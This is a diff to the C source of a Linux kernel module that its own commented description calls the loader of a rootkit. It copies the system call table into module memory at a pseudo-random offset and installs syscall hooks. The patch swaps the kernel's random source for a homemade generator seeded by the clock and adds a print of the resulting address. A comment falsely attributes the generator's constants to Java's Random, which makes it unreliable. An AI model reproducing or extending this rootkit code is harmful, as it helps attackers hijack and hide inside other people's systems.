@@ -142,6 +142,9 @@ int clone_sct(void *dst, void *src, size_t len);
 int sct_len(void *src, size_t *out_len);
 void install_hooks(void);
 void uninstall_hooks(void);
+void rseed(long);
+long rand64(void);
+inline int rand32(void);
 
 /*
  * Global variables.
@@ -245,7 +248,9 @@ int init_module(void)
 	pinfo("sys_call_table len = %d\n", my_sct_len);
 
 	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
-	module_load_offset = (get_random_int() % 1024 + 1) * PAGE_SIZE;
+	rseed(get_seconds());
+	module_load_offset = (rand32() % 1024 + 1) * PAGE_SIZE;
+	pinfo("module_load_offset = %x, addr would be = %p\n", module_load_offset, MODULES_VADDR + module_load_offset);
 	my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, PAGE_KERNEL, 0, NUMA_NO_NODE, __builtin_return_address(0));
 	//my_sct = vmalloc(my_sct_pagelen);
 	if (my_sct == NULL) {
@@ -873,6 +878,27 @@ inline unsigned long long notrace my_rdmsr(unsigned int msr)
     return EAX_EDX_VAL(val, low, high);
 }
 
+// from https://stackoverflow.com/questions/15038174/generate-random-numbers-without-using-any-external-functions
+long rand_a = 0xdeadbabe15c0ffee;   // These Values for a and c are the actual values found
+long rand_c = 11;            // in the implementation of java.util.Random(), see link
+long rand_previous = 0;
+
+void rseed(long seed) {
+    rand_previous = seed;
+}
+
+long rand64(void) {
+    long r = rand_a * rand_previous + rand_c;
+    // Note: typically, one chooses only a couple of bits of this value, see link
+    rand_previous = r;
+    return r;
+}
+
+inline int rand32(void) {
+	return (int)rand64();
+}
+
 MODULE_LICENSE("GPL");
+//MODULE_INFO(intree, "Y");
 //MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
 //MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
